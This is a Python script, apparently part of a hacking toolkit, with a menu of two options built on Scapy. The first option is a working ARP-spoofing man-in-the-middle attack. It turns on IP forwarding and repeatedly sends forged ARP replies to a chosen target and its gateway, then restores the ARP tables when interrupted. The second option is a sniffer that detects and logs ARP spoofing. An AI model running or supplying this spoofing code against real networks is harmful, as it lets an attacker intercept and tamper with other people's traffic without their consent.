from scapy.all import Ether, ARP, srp, send , sniff
import time
import logging
from Modules import intro
from colored import fg, bg, attr
import os
import sys
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
def main():

    print("""
    1 - Arp Spoofing 
    2 - Attack revealed 
    99 - Back 
    """)
    Number = str(input("[[?]]>"))



    angry = fg("white") + attr("bold")
    angry1 = fg("green") + attr("bold")

    def _enable_linux_iproute():
       
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                return
        with open(file_path, "w") as f:
            print(1, file=f)


    def enable_ip_route(verbose=True):
        if verbose:
            print("[!] Enabling IP Routing...")

        _enable_linux_iproute()
        if verbose:
            print("[!] IP Routing enabled.")
    def get_mac(ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
    def spoof(target_ip, host_ip, verbose=True):
        target_mac = get_mac(target_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        send(arp_response, verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
        
    def restore(target_ip, host_ip, verbose=True):

        target_mac = get_mac(target_ip)
        host_mac = get_mac(host_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        send(arp_response, verbose=0, count=7)
        if verbose:
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

    def Detection_attack (pkt):
        if ARP in pkt:
            ip,mac = pkt[ARP].psrc, pkt[ARP].hwsrc
            if ip in DB:
                if mac != DB[ip]:
                    if Ether in pkt:
                        target = pkt[Ether].dst
                    else:
                        target = "%s?" % pkt[ARP].pdst
                        
                    print(f"{angry1}Attack: Target={target} Victim={ip} Attacker={mac}{angry}")
                    open("Attack revealed","a").write(f" Attack: Target={target} \n Victim={ip} \n Attacker={mac}")
            else:
                DB[ip]=mac
                return "Oh!!!!Gathering %s=%s" % (mac,ip)
            
    

    
    if Number == str(1) :
        target = str(input("[?]>> Target:"))
        host = str(input("Host_Getway : "))
        verbose = True
        enable_ip_route()
        try:
            while True:
                spoof(target, host, verbose)
                spoof(host, target, verbose)
                time.sleep(1)
        except KeyboardInterrupt:
            print("[!] CTRL+C Restoring the network, please wait...")
            time.sleep(1)
            restore(target, host)
            restore(host, target)
    if Number == str(2) :
        DB = {}
        sniff(store=0, prn=Detection_attack)
    
    if Number == str(99) or "back" in Number:
        intro.main()
